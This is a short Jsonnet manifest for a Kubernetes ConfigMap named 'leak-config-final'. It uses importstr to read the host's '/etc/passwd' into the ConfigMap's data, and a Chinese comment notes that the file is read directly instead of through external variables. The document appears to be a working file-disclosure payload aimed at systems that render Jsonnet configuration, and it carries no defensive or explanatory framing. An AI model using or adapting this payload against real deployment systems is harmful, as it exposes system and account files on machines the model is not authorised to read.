{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "leak-config-final",
  },
  data: {
    // 直接在代码里执行 importstr，不再依赖外部变量
    "leaked-data": importstr "/etc/passwd"
  }
}
